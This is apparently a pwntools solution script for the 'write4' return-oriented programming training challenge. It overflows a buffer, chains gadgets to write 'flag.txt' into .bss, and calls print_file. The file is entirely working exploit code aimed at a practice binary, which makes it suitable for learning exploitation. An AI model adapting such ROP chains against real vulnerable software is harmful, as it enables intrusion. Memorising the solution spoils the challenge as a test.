from pwn import *

elf = ELF("./write4")

p = elf.process()
raw_input("DEBUG")

bss = 0x601030
pop_rdi = 0x0000000000400693
mov_rsi_edi = 0x0000000000400629
pop_rsi_r15 = 0x0000000000400691

payload = b"A"*40
payload += p64(pop_rdi)
payload += b"flag\x00\x00\x00\x00"
payload += p64(pop_rsi_r15)
payload += p64(bss)
payload += p64(0)
payload += p64(mov_rsi_edi)
payload += p64(pop_rdi)
payload += b".txt\x00\x00\x00\x00"
payload += p64(pop_rsi_r15)
payload += p64(bss+4)
payload += p64(0)
payload += p64(mov_rsi_edi)
payload += p64(pop_rdi)
payload += p64(0x601030)
payload += p64(elf.sym['print_file'])

p.sendline(payload)

p.interactive()
